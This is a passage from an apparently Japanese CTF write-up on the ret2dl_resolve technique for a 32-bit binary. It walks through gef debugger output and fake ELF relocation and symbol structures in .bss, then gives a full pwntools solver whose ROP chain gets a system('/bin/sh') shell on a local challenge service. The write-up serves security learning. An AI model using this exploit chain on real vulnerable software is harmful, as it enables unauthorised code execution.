<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>  gef➤  set $symtab = (Elf32_Sym *)($l.l_ld[9].d_un.d_ptr)
</span></span><span style="display:flex;"><span>  gef➤  set $sym = $symtab[$reloc.r_info&gt;&gt;8]
</span></span><span style="display:flex;"><span>  gef➤  print $sym
</span></span><span style="display:flex;"><span>  $7 = {
</span></span><span style="display:flex;"><span>st_name = 0x1a,
</span></span><span style="display:flex;"><span>st_value = 0x0,
</span></span><span style="display:flex;"><span>st_size = 0x0,
</span></span><span style="display:flex;"><span>st_info = 0x12,
</span></span><span style="display:flex;"><span>st_other = 0x0,
</span></span><span style="display:flex;"><span>st_shndx = 0x0
</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
</div>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div id="outline-container-headline-13" class="outline-5">
<h5 id="headline-13">
<code>.dynstr</code> セクション
</h5>
<div id="outline-text-headline-13" class="outline-text-5">
<p><code>st_name</code> のオフセットを <code>.dynstr</code> セクションのアドレスに足し合わせたアドレスが，シンボルを指すアドレスとなっている。</p>
<ul>
<li>以下の例では， <code>l_ld</code> から <code>.dynsym</code> セクションのアドレスを取得し，その後 <code>r_info</code> から取得したインデックスを元に <code>.dynstr</code> セクションからシンボル名を解決 ( <code>reloc_arg = 0</code> の <code>gets</code> が解決)</li>
</ul>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>  gef➤  set $strtab = (char*)($l.l_ld[8].d_un.d_ptr)
</span></span><span style="display:flex;"><span>  gef➤  set $undef_name = $strtab + $sym.st_name
</span></span><span style="display:flex;"><span>  gef➤  print $undef_name
</span></span><span style="display:flex;"><span>  $8 = 0x8048276 &#34;gets&#34;</span></span></code></pre></div>
</div>
<p>これにより、 <code>link_map</code> 構造体から <code>gets</code> のシンボルが解決されるまでの流れを把握することができた。</p>
<p>
    そこで、次にこの流れを踏まえた上で、 <code>system(&#34;/bin/sh&#34;)</code> 呼び出すためのSolverを作成していく。</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-headline-14" class="outline-3">
<h3 id="headline-14">
2. Solverの作成    
</h3>
<div id="outline-text-headline-14" class="outline-text-3">
<div id="outline-container-headline-15" class="outline-4">
<h4 id="headline-15">
Solverの準備
</h4>
<div id="outline-text-headline-15" class="outline-text-4">
<p>上記の流れを図にすると、それぞれのセクションと構造体とシンボルの関係は以下のようになる。</p>
<pre class="example">
        .rel.plt                         .dynsym                                           .dynstr                                    
            |                                |                                                 |
            |                                |                                                 |
reloc_arg---+   reroc_arg + .rel.plt         |                                                 |
            |                                |                                                 |
            +--&gt;|-----------+----------|     |                                                 |
                | Elf32_Rel | r_offset |     |                                                 |
                |           | r_info   |-----+  (r_info&gt;&gt;8 + .dynsym)*sizeof(Elf32_Sym)        |
                |-----------+----------|     |                                                 |
                                             |                                                 |
                                             +-&gt;|-----------+---------------------------|      |
                                                | Elf32_Sym | st_name                   |------+   st_name + .dynstr
                                                |           | st_value                  |      |
                                                |           | st_size                   |      |
                                                |           | st_info st_other st_shndx |      |
                                                |-----------+---------------------------|      |
                                                                                               |
                                                                                               +--&gt;|-----------+----------|
                                                                                                   | symbol    | &#39;system&#39; |
                                                                                                   |-----------+----------|
</pre>
<p>ここで、 <code>reloc_arg</code> にはスタックバッファオーバフローを利用して任意の値を指定することが可能なため、 <code>.rel.plt</code> の値から偽の <code>Elf32_Rel</code> 構造体を配置したアドレスまでのオフセットを設定する。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  reloc_arg <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">-</span> rel</span></span></code></pre></div>
</div>
<p>
    また、偽の <code>Elf32_Rel</code> 構造体では、 <code>r_info</code> を 8 bitだけ右シフトした値を <code>.dynsym</code> を基準とした偽の <code>Elf32_Sym</code> 構造体へのインデックスとして使用する。
    このため、事前にインデックスを計算し、 <code>Elf32_Rel</code> 構造体に格納しておく。
    このとき、 <code>r_info</code> の下bitが <code>0b111 (0x7)</code> である必要があるため、最後に <code>7</code> を or することで下3bitに1を立てている。</p>
<p>
    <code>r_offset</code> は、解決されたアドレスが格納されるアドレスであり、通常は <code>.got</code> の対応するエントリを指している。
    今回は特に関係ないものの、 <code>gets</code> の GOTエントリを指定しておく。    </p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  r_offset <span style="color:#f92672">=</span> gets_got
</span></span><span style="display:flex;"><span>  r_info   <span style="color:#f92672">=</span> ((Elf32_Sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span></span></span></code></pre></div>
</div>
<p>
    <code>Elf32_Sym</code> 構造体の <code>st_name</code> は、 <code>.dynstr</code> の値から <code>system</code> のシンボルを配置したアドレスまでのオフセットを設定する。
    このため、事前にオフセットの値を計算し、 <code>Elf32_Sym</code> 構造体に格納しておく。</p>
<p>
    <code>st_info</code> は、global変数であることを指す <code>0x12</code> を設定しておく必要があるため、設定しておく。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
</span></span><span style="display:flex;"><span>  st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>  st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>  st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
</span></span><span style="display:flex;"><span>  st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>  st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span></span></span></code></pre></div>
</div>
<div id="outline-container-headline-16" class="outline-5">
<h5 id="headline-16">
<code>.bss</code> 領域への作成した構造体やシンボルの格納
</h5>
<div id="outline-text-headline-16" class="outline-text-5">
<p><code>.bss</code> 領域には，以下のように作成した <code>Elf32_Rel</code> 構造体と <code>Elf32_Sym</code> 構造体， <code>system</code> のシンボル，および <code>/bin/sh</code> の文字列が格納する．    </p>
<pre class="example">
|-----------+----------.bss-------------+---------|
| Elf32_Rel | r_offset                  | 8 byte  |
|           | r_info                    |         |
|-----------+---------------------------+---------|
|           |                           | 8 byte  |
|           |                           | (align) |
|-----------+---------------------------+---------|
| Elf32_Sym | st_name                   | 16 byte |
|           | st_value                  |         |
|           | st_size                   |         |
|           | st_info st_other st_shndx |         |
|-----------+---------------------------+---------|
|           |                           | 4byte   |
|-----------+---------------------------+---------|
| symbol    | &#39;system&#39;                  | 4byte   |
|-----------+---------------------------+---------|
|           |                           | 4byte   |
|-----------+---------------------------+---------|
| argment   | &#39;/bin/sh&#39;                 | 4byte   |
|-----------+---------------------------+---------|
|           |                           |         |
</pre>
<p>このとき， <code>Elf32_Sym</code> 構造体は， <code>dynsym</code> セクションのアドレスから， <code>0x10</code> byteの間隔で配置されなければならないため( <code>Elf32_Sym</code> 構造体のサイズが <code>0x10</code> byteのため)，
    必要なbyte数だけalignしている．</p>
<p>
    Solverを書くときは，事前に <code>.bss</code> のどのアドレスがどの構造体やシンボルに対応するか計算しておき，ROPで <code>gets</code> の引数として指定しておき，ROPチェインが発火後に，それぞれの構造体やシンボルを書き込んでいく．</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Elf32_Rel_addr <span style="color:#f92672">=</span> bss
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Elf32_Sym_addr <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>system_symbol_addr <span style="color:#f92672">=</span> Elf32_Sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sh_symbol_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-17" class="outline-5">
<h5 id="headline-17">
ROPチェインの作成
</h5>
<div id="outline-text-headline-17" class="outline-text-5">
<p>あとは、用意した偽の構造体やシンボルを <code>.bss</code> 領域内に格納できるように、複数回 <code>gets</code> を呼び出す必要がある。</p>
<p>
     そこで、 それぞれ計算しておいた領域に構造体を引数とし、 <code>gets@plt</code> にジャンプするROPを組む。
     x86のROPは、参考のセキュリティコンテストチャレンジブックが参考になる。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#75715e"># padding</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)         <span style="color:#75715e"># saved_ebp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(Elf32_Rel_addr)</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># main return addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(Elf32_Rel_addr)     <span style="color:#75715e"># gets arg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(Elf32_Sym_addr)</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(Elf32_Sym_addr)     <span style="color:#75715e"># gets arg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(system_symbol_addr)</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(system_symbol_addr) <span style="color:#75715e"># gets arg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(sh_symbol_addr)</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return  addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># gets arg</span></span></span></code></pre></div>
</div>
<p>
     それぞれの構造体とシンボルの書き込みを行うROPを組んだ後、偽の構造体を元にアドレスを解決させるため、 <code>.plt</code> セクションの先頭にジャンプする。
     このとき、 <code>system</code> の引数として <code>/bin/sh</code> を取れるように、 <code>/bin/sh</code> が格納されたアドレスをスタックに積んでおく。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(plt)                <span style="color:#75715e"># pop ret return addr</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(reloc_arg)          <span style="color:#75715e"># reloc arg</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)         <span style="color:#75715e"># padding</span>
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># system arg</span></span></span></code></pre></div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-headline-18" class="outline-4">
<h4 id="headline-18">
Solver
</h4>
<div id="outline-text-headline-18" class="outline-text-4">
<div id="outline-container-headline-19" class="outline-5">
<h5 id="headline-19">
solve.py
</h5>
<div id="outline-text-headline-19" class="outline-text-5">
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
</span></span><span style="display:flex;"><span>  chall <span style="color:#f92672">=</span> ELF(filename)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># docker-compose up</span>
</span></span><span style="display:flex;"><span>  conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">9001</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># conn = process(filename)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
</span></span><span style="display:flex;"><span>  bss <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.bss&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
</span></span><span style="display:flex;"><span>  rel <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.rel.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
</span></span><span style="display:flex;"><span>  dynsym <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.dynsym&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
</span></span><span style="display:flex;"><span>  dynstr <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.dynstr&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
</span></span><span style="display:flex;"><span>  gets_got <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;gets&#39;</span>]
</span></span><span style="display:flex;"><span>  gets_plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;gets&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 0x08049022: pop ebx; ret;</span>
</span></span><span style="display:flex;"><span>  pop_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049022</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># .bss section</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | Elf32_Rel | r_offset                  | 8 byte  |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | r_info                    |         |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           | 8 byte  |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           | (align) |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | Elf32_Sym | st_name                   | 16 byte |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_value                  |         |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_size                   |         |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_info st_other st_shndx |         |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           | 4byte   |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | symbol    | &#39;system&#39;                  | 4byte   |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           | 4byte   |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | argment   | &#39;/bin/sh&#39;                 | 4byte   |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           |         |</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Elf32_Rel_addr <span style="color:#f92672">=</span> bss
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Elf32_Sym_addr <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  system_symbol_addr <span style="color:#f92672">=</span> Elf32_Sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  sh_symbol_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># calc index of Elf32_Rel from .rel.plt</span>
</span></span><span style="display:flex;"><span>  reloc_arg <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">-</span> rel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># padding</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)         <span style="color:#75715e"># saved_ebp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># gets(Elf32_Rel_addr)</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># main return addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(Elf32_Rel_addr)     <span style="color:#75715e"># gets arg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># gets(Elf32_Sym_addr)</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(Elf32_Sym_addr)     <span style="color:#75715e"># gets arg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># gets(system_symbol_addr)</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(system_symbol_addr) <span style="color:#75715e"># gets arg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># gets(sh_symbol_addr)</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return  addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># gets arg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(plt)                <span style="color:#75715e"># pop ret return addr</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(reloc_arg)          <span style="color:#75715e"># reloc arg</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)         <span style="color:#75715e"># padding</span>
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># system arg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(buf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># create Elf32_Rel</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">###################################################################################</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># typedef struct</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># {</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Addr	r_offset;		/* Address */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Word	r_info;			/* Relocation type and symbol index */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># } Elf32_Rel;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">###################################################################################</span>
</span></span><span style="display:flex;"><span>  r_offset <span style="color:#f92672">=</span> gets_got
</span></span><span style="display:flex;"><span>  r_info   <span style="color:#f92672">=</span> ((Elf32_Sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | Elf32_Rel | r_offset                  | 8 byte  |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | r_info                    |         |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  Elf32_Rel <span style="color:#f92672">=</span> p32(r_offset)
</span></span><span style="display:flex;"><span>  Elf32_Rel <span style="color:#f92672">+=</span> p32(r_info)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(Elf32_Rel)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># create Elf32_Sym</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">###################################################################################</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># typedef struct</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># {</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Word	st_name;		/* Symbol name (string tbl index) */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Addr	st_value;		/* Symbol value */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Word	st_size;		/* Symbol size */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     unsigned char st_info;		/* Symbol type and binding */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     unsigned char st_other;		/* Symbol visibility */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Section st_shndx;		/* Section index */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># } Elf32_Sym;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">###################################################################################</span>
</span></span><span style="display:flex;"><span>  st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
</span></span><span style="display:flex;"><span>  st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>  st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>  st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
</span></span><span style="display:flex;"><span>  st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>  st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | Elf32_Sym | st_name                   | 16 byte |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_value                  |         |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_size                   |         |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_info st_other st_shndx |         |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">=</span> p32(st_name)
</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p32(st_value)
</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p32(st_size)
</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p8(st_info)
</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p8(st_other)
</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">+=</span> p16(st_shndx)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(Elf32_Sym)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># create system symbol</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | symbol    | &#39;system&#39;                  | 4byte   |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># create sh symbol</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | argment   | &#39;/bin/sh&#39;                 | 4byte   |</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
</span></span><span style="display:flex;"><span>
